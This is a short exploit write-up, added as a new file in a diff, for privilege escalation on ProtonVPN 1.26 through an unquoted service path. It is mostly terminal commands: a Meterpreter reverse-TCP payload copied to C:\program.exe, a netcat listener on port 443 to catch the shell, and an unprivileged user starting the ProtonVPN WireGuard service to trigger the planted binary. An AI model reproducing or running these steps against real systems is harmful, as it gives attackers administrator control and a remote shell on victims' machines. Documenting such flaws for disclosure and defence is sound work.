@@ -1,0 +1,35 @@
+#Exploit ProtonVPN 1.26 [Current Version 4/9/22]
+#Priviledge Escalation leveraging unquoted service path
+
+
+┌──(calvin㉿CB11)-[~]
+└─$ cp windows-meterpreter-staged-reverse-tcp-443.exe /mnt/c/program.exe
+
+┌──(calvin㉿CB11)-[~]
+└─$ sudo nc -lvnp 443
+[sudo] password for calvin:
+listening on [any] 443 ...
+
+Open powershell as a user without priv
+
+=============================================================
+
+PS C:\> net user givemeadmin | findstr /i group
+
+PS C:\Users\calvin> whoami
+cb11\givemeadmin
+
+PS C:\Users\calvin> cd ..
+PS C:\Users> cd ..
+PS C:\> Get-Service -Name "Proton*"
+PS C:\> Get-Service -Name "Proton*" | Out-Gridview
+
+Status   Name               DisplayName
+------   ----               -----------
+Running  ProtonVPN Service  ProtonVPN Service
+Running  ProtonVPN Updat... ProtonVPN Update Service
+Stopped  ProtonVPN WireG... ProtonVPN WireGuard
+
+PS C:\> Start-Service -Name "ProtonVPN Wireguard"
+
+================================================================
